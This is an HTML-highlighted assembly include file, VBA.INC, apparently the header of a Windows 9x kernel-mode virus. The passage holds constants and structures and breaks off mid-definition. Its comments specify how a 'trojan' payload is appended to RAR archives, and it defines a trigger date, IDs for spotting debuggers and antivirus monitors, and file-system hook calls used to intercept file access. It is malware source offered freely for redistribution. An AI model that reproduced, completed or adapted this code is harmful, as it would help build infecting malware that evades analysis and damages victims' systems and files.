<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>VBA.INC</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;COMMENT /</span><span class="sc0">
</span><span class="sc1">;  (C) VBA Ltd. ALL RIGHTS RESERVED.</span><span class="sc0">
</span><span class="sc1">;  E-mail: support@vba.com.by</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  THIS PROGRAM IS FREE FOR COMMERCIAL AND NON-COMMERCIAL USE.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  REDISTRIBUTION AND USE IN SOURCE AND BINARY FORMS, WITH OR WITHOUT</span><span class="sc0">
</span><span class="sc1">;  MODIFICATION, ARE PERMITTED.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  THIS SOFTWARE IS PROVIDED BY VBA LTD. ``AS IS'' AND</span><span class="sc0">
</span><span class="sc1">;  ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE</span><span class="sc0">
</span><span class="sc1">;  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE</span><span class="sc0">
</span><span class="sc1">;  ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE</span><span class="sc0">
</span><span class="sc1">;  FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL</span><span class="sc0">
</span><span class="sc1">;  DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS</span><span class="sc0">
</span><span class="sc1">;  OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)</span><span class="sc0">
</span><span class="sc1">;  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT</span><span class="sc0">
</span><span class="sc1">;  LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY</span><span class="sc0">
</span><span class="sc1">;  OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF</span><span class="sc0">
</span><span class="sc1">;  SUCH DAMAGE.</span><span class="sc0">
</span><span class="sc1">;/</span><span class="sc0">

</span><span class="sc1">;DEBUG      =   1       ;COMMENTED IF RELEASE \
                    ;UNCOMMENTED IF DEBUG</span><span class="sc0">

</span><span class="sc5">HAPPY_YEAR</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">1999</span><span class="sc0">
</span><span class="sc5">HAPPY_MONTH</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">7</span><span class="sc0">
</span><span class="sc5">HAPPY_POSSIBLITY</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">6</span><span class="sc0">

</span><span class="sc5">MSG_POSSIBLITY</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">48</span><span class="sc0">
</span><span class="sc5">NOCHNG_SATT_PSBL</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">CHNG_SNAME_PSBL</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">8</span><span class="sc0">

</span><span class="sc5">WAIT_TIME</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">3</span><span class="sc0">       </span><span class="sc1">;SEC</span><span class="sc0">
</span><span class="sc5">SLEEP_TIME</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">1</span><span class="sc0">       </span><span class="sc1">;MIN</span><span class="sc0">
</span><span class="sc5">MAX_OBJS</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">20</span><span class="sc0">
</span><span class="sc5">MIN_ARC_FILES</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">10</span><span class="sc0">

</span><span class="sc5">WE_HERE</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc12">'!'</span><span class="sc0">
</span><span class="sc5">OUR_PORT</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc12">'SK'</span><span class="sc0">
</span><span class="sc5">STACK_FRAME</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">6</span><span class="sc0">

</span><span class="sc5">TROJAN_NAME_SIZE</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0">       </span><span class="sc1">;XXXX.XXX (FOR EXAMPLE,TEST.TST)</span><span class="sc0">
</span><span class="sc5">TROJAN_STAMP</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">0FFH</span><span class="sc0">        </span><span class="sc1">;DATE STAMP: 07/31/1980 (0FFH) AND</span><span class="sc0">
                    </span><span class="sc1">;LOBYTE(TIME)=0, FOR EXAMPLE,00:00:00</span><span class="sc0">
</span><span class="sc1">;ALSO RAR ARCHIVE MUST HAVE A DATE &lt;= 2 WEEK AGE AT CURRENT DATE.</span><span class="sc0">
</span><span class="sc1">;NOTE: TROJAN MUST BE APPENED TO A RAR ARCHIVE BY "STORED" METHOD. TROJAN MUST</span><span class="sc0">
</span><span class="sc1">;PRESERVE DS,ES,SS,ESP,EBP,EBX,EDX REGISTERS AND HAVE IMAGE OF 32BIT SUBROUTINE</span><span class="sc0">
</span><span class="sc1">;(LAST COMMAND - RETN). ALSO TROJAN MUST HAVE LENGTH &lt;= 2000H BYTES.</span><span class="sc0">
</span><span class="sc1">;ON TROJAN ENTRY:</span><span class="sc0">
</span><span class="sc1">;EDX=BEGIN VIRII MEMORY REGION,ESI=BEGIN OF TROJAN,EBP=STACK FRAME FOR VIRII</span><span class="sc0">
</span><span class="sc1">;INTERNAL VXD CALLS (SEE VXD_CALL SUBROUTINE IN VIRII CODE,YOU MAY ALSO INCLUDE</span><span class="sc0">
</span><span class="sc1">;THIS SUBROUTINE TO TROJAN FOR EFFECTIVE CALLING VXD SERVICES),DS,ES,SS,CS=</span><span class="sc0">
</span><span class="sc1">;RING0 FLAT.</span><span class="sc0">

</span><span class="sc5">LEN_LOADER</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc4">((</span><span class="sc2">168</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc4">)*</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">LEN_IOBUFF</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">400H</span><span class="sc0">
</span><span class="sc5">LEN_HLP_DIR</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">100H</span><span class="sc4">+</span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">DOS_HEADER</span><span class="sc0">
</span><span class="sc5">LEN_MAIN_BUFF</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">0A00H</span><span class="sc0">
</span><span class="sc5">LEN_PEND_JUNK</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">80H</span><span class="sc0">
</span><span class="sc5">LEN_FILL_CRYPT</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">12</span><span class="sc0">
</span><span class="sc5">LEN_FILL_RESTORE</span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">7</span><span class="sc0">
</span><span class="sc5">MIN_VXDNAME_SIZE</span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">80</span><span class="sc0">

</span><span class="sc5">HLP_LEN_LINE</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">102</span><span class="sc0">
</span><span class="sc5">MIN_RELOC_SIZE</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">0A00H</span><span class="sc0">

</span><span class="sc5">GET_CUR_VM_HANDLE</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">18001H</span><span class="sc0">      </span><span class="sc1">;VMM</span><span class="sc0">
</span><span class="sc5">GET_SYSTEM_TIME</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">1803FH</span><span class="sc0">
</span><span class="sc5">_PAGEFREE</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">18055H</span><span class="sc0">
</span><span class="sc5">ALLOCATE_GDT_SELECTOR</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">18076H</span><span class="sc0">
</span><span class="sc5">FREE_GDT_SELECTOR</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">18077H</span><span class="sc0">
</span><span class="sc5">HOOK_DEVICE_SERVICE</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">18090H</span><span class="sc0">
</span><span class="sc5">INSTALL_IO_HANDLER</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">    </span><span class="sc2">18096H</span><span class="sc0">
</span><span class="sc5">GET_CONFIG_DIRECTORY</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">180B7H</span><span class="sc0">
</span><span class="sc5">FATAL_ERROR_HANDLER</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">180BEH</span><span class="sc0">
</span><span class="sc5">_PAGERESERVE</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">1811DH</span><span class="sc0">
</span><span class="sc5">_PAGECOMMIT</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">1811EH</span><span class="sc0">
</span><span class="sc5">_ENTERMUSTCOMPLETE</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">    </span><span class="sc2">18135H</span><span class="sc0">
</span><span class="sc5">_LEAVEMUSTCOMPLETE</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">    </span><span class="sc2">18136H</span><span class="sc0">
</span><span class="sc5">GET_DDB</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">18146H</span><span class="sc0">
</span><span class="sc5">_GETVXDNAME</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">1817EH</span><span class="sc0">
    
</span><span class="sc5">GET_DATE_AND_TIME</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">58008H</span><span class="sc0">      </span><span class="sc1">;VTD</span><span class="sc0">

</span><span class="sc5">SHELL_MESSAGE</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">178004H</span><span class="sc0">     </span><span class="sc1">;SHELL</span><span class="sc0">

</span><span class="sc5">GET_DOSTIME</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">408007H</span><span class="sc0">     </span><span class="sc1">;IFSMGR</span><span class="sc0">
</span><span class="sc5">RING0_FILEIO</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">408032H</span><span class="sc0">
</span><span class="sc5">UNITOBCSPATH</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">408041H</span><span class="sc0">
</span><span class="sc5">INSTALLAPIHOOK</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">408067H</span><span class="sc0">
</span><span class="sc5">REMOVEAPIHOOK</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">408068H</span><span class="sc0">

</span><span class="sc5">WINICE_ID</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">202H</span><span class="sc0">
</span><span class="sc5">BCHECKER_ID</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">205H</span><span class="sc0">
</span><span class="sc5">IMMUNER_ID</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">534BH</span><span class="sc0">
</span><span class="sc5">SIWVID_ID</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">7A5FH</span><span class="sc0">

</span><span class="sc5">EF_HANG_ON_EXIT</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">BYTE_INPUT</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">BLOCK_SVC_INTS</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">BLOCK_THREAD_IDLE</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">10H</span><span class="sc0">

</span><span class="sc5">PR_FIXED</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">8</span><span class="sc0">
</span><span class="sc5">PR_SYSTEM</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">80080000H</span><span class="sc0">
</span><span class="sc5">PC_WRITEABLE</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">20000H</span><span class="sc0">
</span><span class="sc5">PC_FIXED</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">8</span><span class="sc0">
</span><span class="sc5">PD_FIXEDZERO</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">3</span><span class="sc0">

</span><span class="sc5">MAX_PATH</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">260</span><span class="sc0">
</span><span class="sc5">MAX_DOS_PATH</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">128</span><span class="sc0">

</span><span class="sc5">IFSFN_WRITE</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">IFSFN_CLOSE</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">11</span><span class="sc0">
</span><span class="sc5">IFSFN_FILEATTRIB</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">33</span><span class="sc0">
</span><span class="sc5">IFSFN_OPEN</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">36</span><span class="sc0">
</span><span class="sc5">IFSFN_RENAME</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">37</span><span class="sc0">

</span><span class="sc5">IFSFH_RES_UNC</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">IFSFH_RES_NETWORK</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
</span><span class="sc5">IFSFH_RES_LOCAL</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">10H</span><span class="sc0">
</span><span class="sc5">IFSFH_RES_CFSD</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">80H</span><span class="sc0">

</span><span class="sc5">ACCESS_READONLY</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ACCESS_WRITEONLY</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">ACCESS_READWRITE</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">2</span><span class="sc0">

</span><span class="sc5">ACTION_CREATENEW</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">10H</span><span class="sc0">
</span><span class="sc5">ACTION_REPLACEEXISTING</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">ACTION_CREATEALWAYS</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">12H</span><span class="sc0">
</span><span class="sc5">ACTION_OPENALWAYS</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">11H</span><span class="sc0">
</span><span class="sc5">ACTION_OPENEXISTING</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">1</span><span class="sc0">

</span><span class="sc5">R0_NO_CACHE</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">100H</span><span class="sc0">
</span><span class="sc5">OPEN_FLAGS_REOPEN</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">800H</span><span class="sc0">
</span><span class="sc5">R0_SWAPPER_CALL</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">1000H</span><span class="sc0">
</span><span class="sc5">OPEN_FLAGS_COMMIT</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">4000H</span><span class="sc0">

</span><span class="sc5">FILE_FLAG_WILDCARDS</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">80000000H</span><span class="sc0">

</span><span class="sc5">FA_READONLY</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">FA_SYSTEM</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">FA_LABEL</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">8</span><span class="sc0">
</span><span class="sc5">FA_DIRECTORY</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">10H</span><span class="sc0">
</span><span class="sc5">FA_DEVICE</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">40H</span><span class="sc0">

</span><span class="sc5">FGET_ATTRIBUTES</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">; GET ATTRIBUTES OF FILE/DIR</span><span class="sc0">
</span><span class="sc5">FSET_ATTRIBUTES</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">1</span><span class="sc0">   </span><span class="sc1">; SET ATTRIBUTES OF FILE/DIR</span><span class="sc0">
</span><span class="sc5">SET_ATTRIB_MODIFY_DATETIME</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">    </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc5">SET_ATTRIB_LAST_ACCESS_DATETIME</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
</span><span class="sc5">SET_ATTRIB_CREATION_DATETIME</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc0">

</span><span class="sc5">OPEN_ACCESS_READONLY</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">OPEN_ACCESS_WRITEONLY</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">OPEN_ACCESS_READWRITE</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">OPEN_ACCESS_RO_NOMODLASTACCESS</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">OPEN_SHARE_DENYREADWRITE</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">10H</span><span class="sc0">
</span><span class="sc5">OPEN_SHARE_DENYWRITE</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">20H</span><span class="sc0">
</span><span class="sc5">OPEN_FLAGS_NOCRITERR</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">2000H</span><span class="sc0">
</span><span class="sc5">FILE_OPEN</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">FILE_CREATE</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">10H</span><span class="sc0">
</span><span class="sc5">FILE_TRUNCATE</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">2</span><span class="sc0">

</span><span class="sc5">R0_OPENCREATFILE</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">0D500H</span><span class="sc0">  </span><span class="sc1">; OPEN/CREATE A FILE</span><span class="sc0">
</span><span class="sc5">R0_READFILE</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">0D600H</span><span class="sc0">  </span><span class="sc1">; READ A FILE, NO CONTEXT</span><span class="sc0">
</span><span class="sc5">R0_WRITEFILE</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">0D601H</span><span class="sc0">  </span><span class="sc1">; WRITE TO A FILE, NO CONTEXT</span><span class="sc0">
</span><span class="sc5">R0_CLOSEFILE</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">0D700H</span><span class="sc0">  </span><span class="sc1">; CLOSE A FILE</span><span class="sc0">
</span><span class="sc5">R0_GETFILESIZE</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">0D800H</span><span class="sc0">  </span><span class="sc1">; GET SIZE OF A FILE</span><span class="sc0">
</span><span class="sc5">R0_FINDFIRSTFILE</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">4E00H</span><span class="sc0">   </span><span class="sc1">; DO A LFN FINDFIRST OPERATION</span><span class="sc0">
</span><span class="sc5">R0_FINDNEXTFILE</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">4F00H</span><span class="sc0">   </span><span class="sc1">; DO A LFN FINDNEXT OPERATION</span><span class="sc0">
</span><span class="sc5">R0_FINDCLOSEFILE</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">0DC00H</span><span class="sc0">  </span><span class="sc1">; DO A LFN FINDCLOSE OPERATION</span><span class="sc0">
</span><span class="sc5">R0_FILEATTRIBUTES</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">4300H</span><span class="sc0">   </span><span class="sc1">; GET/SET ATTRIBUTES OF A FILE</span><span class="sc0">
</span><span class="sc5">R0_DELETEFILE</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">4100H</span><span class="sc0">   </span><span class="sc1">; DELETE A FILE</span><span class="sc0">
</span><span class="sc5">R0_GETDISKFREESPACE</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">3600H</span><span class="sc0">   </span><span class="sc1">; GET DISK FREE SPACE</span><span class="sc0">

</span><span class="sc5">IOREQ</span><span class="sc0">       </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">IR_LENGTH</span><span class="sc0">   </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;0 LENGTH OF USER BUFFER</span><span class="sc0">
</span><span class="sc5">IR_FLAGS</span><span class="sc0">    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;4 MISC. STATUS FLAGS</span><span class="sc0">
</span><span class="sc5">IR_USER</span><span class="sc0">     </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;5 USER ID FOR THIS REQUEST</span><span class="sc0">
</span><span class="sc5">IR_SFN</span><span class="sc0">      </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;6 SYSTEM FILE NUMBER OF FILE HANDLE</span><span class="sc0">
</span><span class="sc5">IR_PID</span><span class="sc0">      </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;8 PROCESS ID OF REQUESTING TASK</span><span class="sc0">
</span><span class="sc5">IR_PPATH</span><span class="sc0">    </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;C UNICODE PATHNAME</span><span class="sc0">
</span><span class="sc5">IR_AUX1</span><span class="sc0">     </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;10 SECONDARY USER DATA BUFFER (CURDTA)</span><span class="sc0">
</span><span class="sc5">IR_DATA</span><span class="sc0">     </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;14 PTR TO USER DATA BUFFER</span><span class="sc0">
</span><span class="sc5">IR_OPTIONS</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;18 REQUEST HANDLING OPTIONS</span><span class="sc0">
</span><span class="sc5">IR_ERROR</span><span class="sc0">    </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;1A ERROR CODE (0 IF OK)</span><span class="sc0">
</span><span class="sc5">IR_RH</span><span class="sc0">       </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;1C RESOURCE HANDLE</span><span class="sc0">
</span><span class="sc5">IR_FH</span><span class="sc0">       </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;20 FILE (OR FIND) HANDLE</span><span class="sc0">
</span><span class="sc5">IR_POS</span><span class="sc0">      </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;24 FILE POSITION FOR REQUEST</span><span class="sc0">
</span><span class="sc5">IR_AUX2</span><span class="sc0">     </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;28 MISC. EXTRA API PARAMETERS</span><span class="sc0">
</span><span class="sc5">IR_UPATH</span><span class="sc0">    </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;2C MISC. EXTRA API PARAMETERS</span><span class="sc0">
</span><span class="sc5">IR_PEV</span><span class="sc0">      </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;30 PTR TO IFSMGR EVENT FOR ASYNC REQUESTS</span><span class="sc0">
</span><span class="sc5">IR_FSD</span><span class="sc0">      </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">64</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">;34 PROVIDER WORK SPACE</span><span class="sc0">
        </span><span class="sc9">ENDS</span><span class="sc0">

</span><span class="sc5">IR_SIZE</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc5">IR_POS</span><span class="sc0">
</span><span class="sc5">IR_ATTR2</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc5">IR_POS</span><span class="sc0">      </span><span class="sc1">; DESTINATION ATTRIBUTES FOR RENAME</span><span class="sc0">
</span><span class="sc5">IR_ATTR</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc5">IR_LENGTH</span><span class="sc0">   </span><span class="sc1">; DOS FILE ATTRIBUTE INFO</span><span class="sc0">
</span><span class="sc5">IR_DATETIME</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc5">IR_AUX2</span><span class="sc0">     </span><span class="sc1">; OVERLAYED ON RETURN FROM FSD</span><span class="sc0">

</span><span class="sc5">PATH_ELEMENT</span><span class="sc0">    </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">PE_LENGTH</span><span class="sc0">   </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">PE_UNICHARS</span><span class="sc0"> </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc9">ENDS</span><span class="sc0">

</span><span class="sc5">PARSED_PATH</span><span class="sc0"> </span><span class="sc9">STRUC</span><span class="sc0">
